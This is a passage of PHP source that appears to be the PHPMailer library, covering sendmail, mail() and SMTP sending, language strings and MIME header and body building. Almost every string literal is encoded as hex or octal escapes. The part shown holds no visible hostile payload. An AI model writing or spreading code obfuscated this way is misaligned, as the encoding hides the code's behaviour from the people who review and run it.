and self::isPermittedPath($this->DKIM_private) and file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = rtrim($this->MIMEHeader, "\xd\12\x20") . self::CRLF . str_replace("\15\12", "\12", $header_dkim) . self::CRLF; } return true; } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\x73\145\156\144\x6d\x61\151\154": case "\x71\155\x61\151\154": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\163\155\x74\160": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\x6d\141\x69\x6c": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\x53\145\x6e\144"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if (!empty($this->Sender) and self::isShellSafe($this->Sender)) { if ($this->Mailer == "\x71\x6d\x61\x69\x6c") { $sendmailFmt = "\45\x73\x20\x2d\146\x25\x73"; } else { $sendmailFmt = "\x25\x73\x20\x2d\x6f\151\40\55\x66\45\163\40\55\x74"; } } else { if ($this->Mailer == "\161\x6d\141\x69\x6c") { $sendmailFmt = "\45\x73"; } else { $sendmailFmt = "\45\163\x20\55\157\151\40\55\x74"; } } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { if (!@($mail = popen($sendmail, "\x77"))) { throw new phpmailerException($this->lang("\145\170\x65\x63\x75\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, "\124\157\x3a\x20" . $toAddr . "\xa"); fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\145\x78\145\x63\165\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } } else { if (!@($mail = popen($sendmail, "\x77"))) { throw new phpmailerException($this->lang("\x65\170\x65\x63\x75\164\145") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\x65\170\x65\143\165\164\x65") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string), array("\47{$string}\47", "\42{$string}\x22"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; $i++) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\100\x5f\55\56", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\x23\x5e\x5b\141\55\x7a\x5d\x2b\72\x2f\x2f\x23\151", $path); } protected function mailSend($header, $body) { $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = implode("\54\40", $toArr); $params = null; if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\x2d\x66\45\x73", $this->Sender); } } if (!empty($this->Sender) and !ini_get("\x73\x61\x66\x65\x5f\155\157\144\145") and $this->validateAddress($this->Sender)) { $old_from = ini_get("\163\x65\156\144\x6d\x61\151\x6c\x5f\146\162\157\155"); ini_set("\163\x65\156\144\155\141\x69\154\137\x66\162\x6f\x6d", $this->Sender); } $result = false; if ($this->SingleTo and count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); } if (isset($old_from)) { ini_set("\x73\145\156\x64\x6d\x61\x69\154\137\x66\162\157\155", $old_from); } if (!$result) { throw new phpmailerException($this->lang("\x69\156\163\164\141\x6e\164\x69\x61\164\145"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } protected function smtpSend($header, $body) { $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new phpmailerException($this->lang("\x73\x6d\x74\160\x5f\143\x6f\x6e\156\145\x63\164\137\x66\141\151\x6c\x65\144"), self::STOP_CRITICAL); } if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { $smtp_from = $this->Sender; } else { $smtp_from = $this->From; } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\x66\x72\157\x6d\137\146\x61\151\x6c\x65\x64") . $smtp_from . "\x20\x3a\x20" . implode("\54", $this->smtp->getError())); throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL); } foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0])) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\164\x6f" => $to[0], "\145\x72\162\x6f\162" => $error["\x64\x65\x74\141\151\x6c"]); $isSent = false; } else { $isSent = true; } $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From); } } if (count($this->all_recipients) > count($bad_rcpt) and !$this->smtp->data($header . $body)) { throw new phpmailerException($this->lang("\x64\x61\x74\141\137\156\157\x74\137\141\143\x63\x65\x70\164\x65\144"), self::STOP_CRITICAL); } if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\x74\157"] . "\x3a\x20" . $bad["\145\162\x72\157\162"]; } throw new phpmailerException($this->lang("\x72\x65\x63\151\x70\151\x65\156\164\x73\137\146\141\x69\x6c\145\144") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (is_null($this->smtp)) { $this->smtp = $this->getSMTPInstance(); } if (is_null($options)) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $hosts = explode("\73", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\57\136\x28\x28\x73\x73\154\x7c\x74\154\x73\x29\72\x5c\x2f\134\x2f\x29\x2a\50\x5b\x61\x2d\172\x41\x2d\132\x30\55\71\134\56\55\135\x2a\x7c\134\133\133\x61\55\146\101\x2d\106\60\x2d\71\x3a\135\53\134\135\x29\72\x3f\x28\133\x30\55\x39\135\52\x29\x24\57", trim($hostentry), $hostinfo)) { $this->edebug("\111\147\156\x6f\x72\151\156\147\x20\151\156\x76\x61\154\x69\x64\x20\150\157\x73\x74\x3a\x20" . $hostentry); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = $this->SMTPSecure == "\x74\x6c\x73"; if ("\163\x73\x6c" == $hostinfo[2] or '' == $hostinfo[2] and "\163\x73\154" == $this->SMTPSecure) { $prefix = "\163\x73\x6c\x3a\x2f\57"; $tls = false; $secure = "\x73\x73\154"; } elseif ($hostinfo[2] == "\x74\154\x73") { $tls = true; $secure = "\164\154\x73"; } $sslext = defined("\117\x50\x45\116\x53\123\114\137\101\114\107\117\x5f\x53\110\101\61"); if ("\x74\x6c\x73" === $secure or "\163\x73\154" === $secure) { if (!$sslext) { throw new phpmailerException($this->lang("\x65\x78\164\x65\x6e\163\x69\157\156\x5f\155\151\x73\x73\151\x6e\147") . "\157\160\145\156\x73\x73\x6c", self::STOP_CRITICAL); } } $host = $hostinfo[3]; $port = $this->Port; $tport = (int) $hostinfo[4]; if ($tport > 0 and $tport < 65536) { $port = $tport; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS and $sslext and $secure != "\163\163\154" and $this->smtp->getServerExt("\x53\124\101\122\x54\x54\x4c\x53")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { throw new phpmailerException($this->lang("\x63\157\x6e\156\x65\143\x74\137\x68\x6f\163\x74")); } $this->smtp->hello($hello); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation)) { throw new phpmailerException($this->lang("\x61\165\164\150\x65\156\x74\151\143\141\164\145")); } } return true; } catch (phpmailerException $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions and !is_null($lastexception)) { throw $lastexception; } return false; } public function smtpClose() { if (is_a($this->smtp, "\123\115\124\x50")) { if ($this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } } public function setLanguage($langcode = "\x65\x6e", $lang_path = '') { $renamed_langcodes = array("\x62\162" => "\x70\164\137\142\162", "\143\172" => "\143\163", "\x64\153" => "\144\141", "\156\x6f" => "\156\x62", "\x73\145" => "\163\x76", "\x73\162" => "\162\x73"); if (isset($renamed_langcodes[$langcode])) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\141\165\x74\150\x65\x6e\x74\x69\143\141\164\x65" => "\x53\x4d\124\120\40\x45\x72\162\x6f\162\72\x20\x43\157\x75\x6c\144\x20\x6e\x6f\x74\x20\x61\165\x74\150\145\x6e\x74\x69\143\x61\x74\x65\x2e", "\x63\x6f\x6e\156\145\143\x74\137\x68\x6f\163\x74" => "\x53\115\124\x50\40\x45\x72\x72\157\162\x3a\x20\x43\157\x75\154\144\x20\x6e\x6f\164\40\x63\157\x6e\156\145\x63\164\x20\164\157\x20\123\x4d\124\x50\x20\x68\x6f\163\x74\56", "\144\141\164\141\137\x6e\157\164\x5f\141\x63\x63\x65\160\164\x65\144" => "\x53\115\124\120\40\105\x72\162\x6f\162\72\40\x64\x61\164\x61\40\x6e\157\164\40\141\143\143\x65\160\164\145\144\56", "\x65\x6d\160\x74\x79\137\155\x65\163\x73\141\147\145" => "\115\145\163\163\x61\147\x65\x20\x62\157\144\171\40\145\x6d\x70\164\171", "\145\156\143\157\x64\151\x6e\x67" => "\125\x6e\153\156\x6f\x77\156\40\x65\x6e\x63\x6f\144\x69\x6e\x67\72\40", "\145\x78\145\x63\165\x74\145" => "\103\157\x75\x6c\144\40\156\157\164\40\x65\170\x65\143\165\x74\x65\x3a\x20", "\x66\x69\x6c\145\x5f\141\x63\x63\x65\163\163" => "\103\157\x75\x6c\x64\x20\x6e\157\x74\x20\141\x63\x63\x65\x73\163\x20\146\151\x6c\x65\72\x20", "\146\151\x6c\x65\x5f\x6f\x70\145\156" => "\106\151\154\x65\40\105\x72\162\x6f\162\x3a\x20\x43\x6f\165\154\x64\x20\156\157\164\40\157\160\x65\156\x20\x66\151\x6c\x65\x3a\40", "\x66\162\x6f\155\x5f\146\141\x69\154\145\144" => "\x54\150\145\40\146\x6f\x6c\x6c\x6f\x77\x69\156\x67\40\106\162\x6f\155\40\x61\144\x64\162\x65\x73\163\x20\146\141\151\154\x65\x64\72\x20", "\151\x6e\163\x74\x61\156\164\151\x61\164\145" => "\103\157\x75\154\x64\40\156\x6f\164\x20\x69\x6e\163\164\x61\156\164\x69\141\164\x65\40\x6d\141\x69\154\x20\x66\x75\156\143\164\x69\157\156\56", "\151\156\x76\141\154\151\144\x5f\141\x64\x64\x72\145\x73\163" => "\111\x6e\x76\x61\154\151\x64\40\141\144\x64\x72\145\x73\163\x3a\40", "\x6d\141\x69\x6c\145\162\137\x6e\x6f\x74\137\x73\x75\160\x70\157\x72\164\145\144" => "\40\x6d\x61\x69\x6c\x65\162\40\x69\163\x20\156\x6f\x74\40\163\x75\x70\x70\x6f\162\164\145\x64\x2e", "\x70\x72\x6f\x76\x69\144\145\x5f\x61\x64\144\162\x65\163\x73" => "\x59\x6f\x75\x20\x6d\165\163\164\40\160\x72\x6f\x76\x69\144\145\40\x61\164\40\x6c\145\x61\163\164\x20\x6f\156\x65\40\162\145\143\x69\160\x69\145\x6e\x74\x20\145\x6d\141\x69\154\40\x61\x64\x64\x72\x65\x73\163\x2e", "\162\145\x63\151\160\x69\x65\156\x74\163\x5f\x66\x61\x69\x6c\145\144" => "\123\115\x54\120\40\105\162\162\157\162\x3a\40\124\150\x65\40\146\x6f\x6c\x6c\157\167\151\156\x67\x20\x72\145\x63\x69\160\x69\x65\156\164\163\40\x66\x61\151\154\145\144\x3a\x20", "\163\x69\x67\x6e\x69\x6e\x67" => "\123\x69\147\x6e\151\156\x67\x20\x45\x72\x72\157\x72\x3a\40", "\x73\155\x74\x70\x5f\x63\x6f\x6e\x6e\x65\143\164\x5f\x66\141\151\154\x65\x64" => "\x53\x4d\x54\x50\40\x63\157\156\x6e\x65\143\x74\50\x29\x20\x66\x61\x69\154\145\x64\x2e", "\x73\155\x74\x70\137\x65\162\x72\x6f\162" => "\x53\x4d\x54\120\x20\163\x65\x72\166\x65\x72\40\x65\162\x72\x6f\162\72\40", "\x76\x61\x72\x69\x61\x62\x6c\145\137\x73\145\x74" => "\103\x61\156\x6e\x6f\164\40\163\x65\164\40\x6f\x72\40\x72\x65\163\145\164\x20\x76\141\x72\151\141\x62\154\145\x3a\x20", "\145\x78\164\x65\156\x73\x69\x6f\156\x5f\x6d\x69\x73\x73\151\x6e\x67" => "\x45\x78\x74\145\156\x73\x69\x6f\156\40\x6d\151\163\x73\x69\x6e\x67\72\40"); if (empty($lang_path)) { $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . "\154\x61\x6e\147\165\141\147\x65" . DIRECTORY_SEPARATOR; } if (!preg_match("\57\136\133\141\x2d\172\x5d\x7b\62\x7d\x28\77\72\x5f\133\141\x2d\172\101\x2d\x5a\135\173\x32\x7d\51\77\x24\x2f", $langcode)) { $langcode = "\145\156"; } $foundlang = true; $lang_file = $lang_path . "\x70\150\160\x6d\141\151\154\145\x72\56\154\141\x6e\x67\55" . $langcode . "\56\x70\x68\x70"; if ($langcode != "\x65\x6e") { if (!self::isPermittedPath($lang_file) or !is_readable($lang_file)) { $foundlang = false; } else { $foundlang = (include $lang_file); } } $this->language = $PHPMAILER_LANG; return (bool) $foundlang; } public function getTranslations() { return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\72\40" . implode("\54\x20", $addresses) . $this->LE; } public function addrFormat($addr) { if (empty($addr[1])) { return $this->secureHeader($addr[0]); } else { return $this->encodeHeader($this->secureHeader($addr[1]), "\x70\150\162\141\x73\145") . "\40\x3c" . $this->secureHeader($addr[0]) . "\76"; } } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\x20\x3d\x25\163", $this->LE); } else { $soft_break = $this->LE; } $is_utf8 = strtolower($this->CharSet) == "\x75\x74\x66\55\70"; $lelen = strlen($this->LE); $crlflen = strlen(self::CRLF); $message = $this->fixEOL($message); if (substr($message, -$lelen) == $this->LE) { $message = substr($message, 0, -$lelen); } $lines = explode($this->LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\40", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode and strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\x3d") { $len--; } elseif (substr($word, $len - 2, 1) == "\75") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\40" . $part; $message .= $buf . sprintf("\75\x25\x73", self::CRLF); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\x3d") { $len--; } elseif (substr($word, $len - 2, 1) == "\75") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("\75\45\x73", self::CRLF); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\40"; } $buf .= $word; if (strlen($buf) > $length and $buf_o != '') { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . self::CRLF; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\75"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\154\x74": case "\141\x6c\x74\137\151\156\154\151\x6e\145": case "\x61\x6c\164\137\x61\x74\164\x61\x63\150": case "\x61\x6c\x74\x5f\x69\x6e\154\x69\x6e\145\x5f\141\x74\x74\x61\143\x68": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\x44\x61\x74\x65", $this->MessageDate == '' ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ($this->Mailer != "\155\x61\151\x6c") { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } } else { if (count($this->to) > 0) { if ($this->Mailer != "\155\141\x69\x6c") { $result .= $this->addrAppend("\124\x6f", $this->to); } } elseif (count($this->cc) == 0) { $result .= $this->headerLine("\124\x6f", "\x75\156\144\151\163\x63\154\x6f\163\x65\x64\55\162\x65\143\151\x70\x69\x65\156\x74\163\72\73"); } } $result .= $this->addrAppend("\106\x72\157\155", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\x43\143", $this->cc); } if (($this->Mailer == "\163\145\156\x64\155\x61\151\x6c" or $this->Mailer == "\161\155\x61\151\x6c" or $this->Mailer == "\x6d\x61\x69\x6c") and count($this->bcc) > 0) { $result .= $this->addrAppend("\x42\143\x63", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\122\x65\160\x6c\x79\55\124\x6f", $this->ReplyTo); } if ($this->Mailer != "\x6d\141\x69\x6c") { $result .= $this->headerLine("\123\x75\x62\x6a\145\143\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' != $this->MessageID and preg_match("\x2f\x5e\74\56\52\x40\56\x2a\76\x24\x2f", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\74\x25\x73\x40\45\163\76", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\x4d\145\x73\x73\141\x67\x65\x2d\111\104", $this->lastMessageID); if (!is_null($this->Priority)) { $result .= $this->headerLine("\x58\x2d\120\162\x69\157\162\151\x74\x79", $this->Priority); } if ($this->XMailer == '') { $result .= $this->headerLine("\x58\55\115\x61\x69\154\145\162", "\120\x48\120\115\141\x69\154\145\162\40" . $this->Version . "\40\x28\x68\x74\x74\160\163\x3a\57\57\x67\x69\x74\x68\165\142\x2e\x63\157\x6d\x2f\x50\110\120\115\x61\x69\154\145\162\x2f\x50\110\x50\x4d\141\x69\154\x65\x72\x29"); } else { $myXmailer = trim($this->XMailer); if ($myXmailer) { $result .= $this->headerLine("\x58\x2d\x4d\x61\151\154\145\162", $myXmailer); } } if ($this->ConfirmReadingTo != '') { $result .= $this->headerLine("\x44\151\163\x70\157\x73\151\164\x69\157\x6e\x2d\x4e\157\164\151\146\x69\143\141\164\x69\157\x6e\55\x54\x6f", "\74" . $this->ConfirmReadingTo . "\76"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\115\x49\115\x45\x2d\x56\x65\162\x73\x69\157\x6e", "\61\x2e\60"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\x69\156\x6c\151\x6e\x65": $result .= $this->headerLine("\103\x6f\156\x74\145\x6e\x74\55\124\171\160\145", "\155\165\154\164\151\x70\x61\162\164\x2f\x72\x65\154\141\x74\145\x64\73"); $result .= $this->textLine("\11\x62\x6f\x75\156\144\141\162\x79\x3d\x22" . $this->boundary[1] . "\x22"); break; case "\141\164\164\141\x63\x68": case "\x69\156\x6c\151\x6e\145\x5f\x61\x74\164\x61\x63\x68": case "\141\154\164\137\141\164\x74\141\143\150": case "\x61\x6c\x74\x5f\x69\x6e\154\x69\156\145\137\141\164\164\141\x63\150": $result .= $this->headerLine("\103\157\x6e\164\x65\x6e\164\55\x54\171\x70\145", "\155\165\x6c\x74\151\160\x61\x72\164\x2f\x6d\x69\170\x65\x64\73"); $result .= $this->textLine("\x9\x62\157\x75\156\x64\141\x72\171\x3d\x22" . $this->boundary[1] . "\x22"); break; case "\x61\x6c\164": case "\x61\154\164\x5f\151\x6e\x6c\151\156\145": $result .= $this->headerLine("\103\x6f\x6e\164\145\x6e\164\x2d\124\x79\x70\x65", "\x6d\x75\154\x74\x69\x70\x61\x72\164\57\x61\154\x74\145\x72\156\141\x74\151\166\x65\x3b"); $result .= $this->textLine("\x9\142\157\x75\x6e\144\141\x72\x79\x3d\42" . $this->boundary[1] . "\x22"); break; default: $result .= $this->textLine("\x43\157\x6e\164\145\156\x74\55\124\x79\x70\145\x3a\x20" . $this->ContentType . "\73\40\143\150\x61\162\163\x65\x74\x3d" . $this->CharSet); $ismultipart = false; break; } if ($this->Encoding != "\x37\142\151\164") { if ($ismultipart) { if ($this->Encoding == "\70\142\x69\x74") { $result .= $this->headerLine("\103\x6f\x6e\x74\145\156\164\x2d\x54\x72\x61\156\x73\x66\145\x72\x2d\x45\x6e\x63\157\144\x69\x6e\147", "\70\142\x69\164"); } } else { $result .= $this->headerLine("\103\x6f\x6e\164\145\156\x74\x2d\124\x72\x61\156\x73\146\145\x72\x2d\105\156\143\x6f\144\151\156\x67", $this->Encoding); } } if ($this->Mailer != "\155\x61\x69\x6c") { $result .= $this->LE; } return $result; } public function getSentMIMEMessage() { return rtrim($this->MIMEHeader . $this->mailHeader, "\12\15") . self::CRLF . self::CRLF . $this->MIMEBody; } protected function generateId() { return md5(uniqid(time())); } public function createBody() { $body = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = "\x62\61\x5f" . $this->uniqueid; $this->boundary[2] = "\142\62\x5f" . $this->uniqueid; $this->boundary[3] = "\x62\63\137" . $this->uniqueid; if ($this->sign_key_file) { $body .= $this->getMailMIME() . $this->LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if ($bodyEncoding == "\70\x62\x69\164" and !$this->has8bitChars($this->Body)) { $bodyEncoding = "\x37\x62\x69\164"; $bodyCharSet = "\x75\x73\55\141\x73\143\151\151"; } if ("\x62\141\x73\x65\66\64" != $this->Encoding and self::hasLineLongerThanMax($this->Body)) { $bodyEncoding = "\x71\165\157\164\145\x64\x2d\x70\x72\x69\x6e\164\141\142\x6c\x65"; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if ($altBodyEncoding == "\x38\x62\x69\x74" and !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = "\67\x62\x69\x74"; $altBodyCharSet = "\x75\x73\55\x61\x73\x63\x69\151"; } if ("\142\141\163\145\x36\64" != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = "\161\x75\x6f\164\145\x64\x2d\160\x72\x69\156\164\x61\142\154\x65"; } $mimepre = "\x54\150\151\163\x20\x69\x73\x20\x61\40\155\165\x6c\164\151\x2d\x70\141\162\x74\40\155\x65\x73\x73\x61\x67\145\40\x69\x6e\40\x4d\111\115\105\x20\x66\x6f\162\155\141\164\x2e" . $this->LE . $this->LE; switch ($this->message_type) { case "\x69\156\x6c\x69\156\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\156\154\151\x6e\x65", $this->boundary[1]); break; case "\x61\164\164\141\x63\x68": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x61\164\164\x61\143\150\155\145\x6e\164", $this->boundary[1]); break; case "\x69\x6e\154\x69\x6e\x65\137\141\164\x74\x61\x63\x68": $body .= $mimepre; $body .= $this->textLine("\55\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\156\164\145\156\164\55\x54\171\160\145", "\x6d\165\x6c\164\x69\160\x61\x72\164\x2f\x72\x65\154\x61\x74\x65\144\x3b"); $body .= $this->textLine("\11\142\x6f\165\156\144\141\162\x79\75\x22" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\156\154\x69\x6e\145", $this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\x74\164\x61\143\x68\x6d\145\x6e\164", $this->boundary[1]); break; case "\x61\154\164": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\164\145\170\x74\x2f\x70\154\x61\x69\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, "\x74\145\170\x74\57\150\x74\155\154", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[1], '', "\164\x65\x78\x74\x2f\x63\x61\x6c\145\156\x64\141\x72\x3b\40\155\x65\164\x68\x6f\x64\x3d\x52\105\121\x55\105\123\124", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= $this->LE . $this->LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\141\x6c\164\x5f\x69\156\x6c\151\156\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\164\145\170\x74\57\x70\x6c\x61\x69\156", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\164\145\156\164\x2d\x54\x79\x70\x65", "\x6d\165\154\x74\x69\160\141\162\x74\57\x72\x65\154\141\x74\145\x64\73"); $body .= $this->textLine("\11\x62\x6f\165\156\144\141\x72\x79\75\x22" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\x74\x65\x78\x74\57\x68\164\155\154", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\x6e\154\151\156\x65", $this->boundary[2]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\x61\x6c\164\137\141\164\x74\141\143\150": $body .= $mimepre; $body .= $this->textLine("\55\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\164\145\x6e\164\x2d\124\x79\x70\145", "\x6d\165\x6c\164\x69\160\141\x72\x74\57\x61\x6c\x74\x65\x72\156\141\x74\151\x76\x65\x3b"); $body .= $this->textLine("\x9\142\157\x75\156\x64\141\x72\x79\75\x22" . $this->boundary[2] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\164\x65\x78\x74\x2f\x70\x6c\x61\151\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\x74\145\x78\x74\57\x68\x74\x6d\154", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\x61\x74\x74\x61\x63\150\155\x65\x6e\164", $this->boundary[1]); break; case "\141\154\x74\137\x69\156\x6c\x69\156\x65\137\141\164\164\x61\143\150": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\156\164\145\156\164\55\x54\x79\x70\x65", "\155\x75\x6c\x74\151\x70\x61\162\x74\x2f\141\x6c\x74\x65\162\156\x61\x74\151\166\145\73"); $body .= 